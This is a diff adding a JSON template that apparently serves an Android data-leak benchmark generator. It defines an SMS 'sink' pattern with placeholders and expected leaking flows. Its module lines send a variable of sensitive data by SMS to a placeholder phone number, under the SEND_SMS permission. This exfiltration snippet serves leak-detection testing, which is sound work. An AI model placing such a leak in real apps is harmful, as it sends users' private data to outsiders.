@@ -1,0 +1,44 @@
+{
+    "type": "SINK",
+    "pattern": "IN",
+    "imports": [
+        "import android.telephony.SmsManager;"
+    ],
+    "globals": [
+        "{{ globals }}",
+        "{{ globals }}"
+    ],
+    "module": [
+        "SmsManager §sm$ = SmsManager.getDefault();",
+        "§sm$.sendTextMessage(\"+49123\", null, sensitiveData_€, null, null);",
+        "{{ module }}",
+        "{{ module }}"
+    ],
+    "methods": [
+        "{{ methods }}",
+        "{{ methods }}"
+    ],
+    "classes": [
+        "{{ classes }}",
+        "{{ classes }}"
+    ],
+    "permissions": [
+        "<uses-permission android:name=\"android.permission.SEND_SMS\"/>"
+    ],
+    "flows": [
+        {
+            "className": "",
+            "methodSignature": "",
+            "statementSignature": "android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)",
+            "leaking": true,
+	        "reachable": true
+        },
+        {
+            "className": "",
+            "methodSignature": "",
+            "statementSignature": "",
+            "leaking": true,
+            "reachable": true
+        }
+    ]
+}
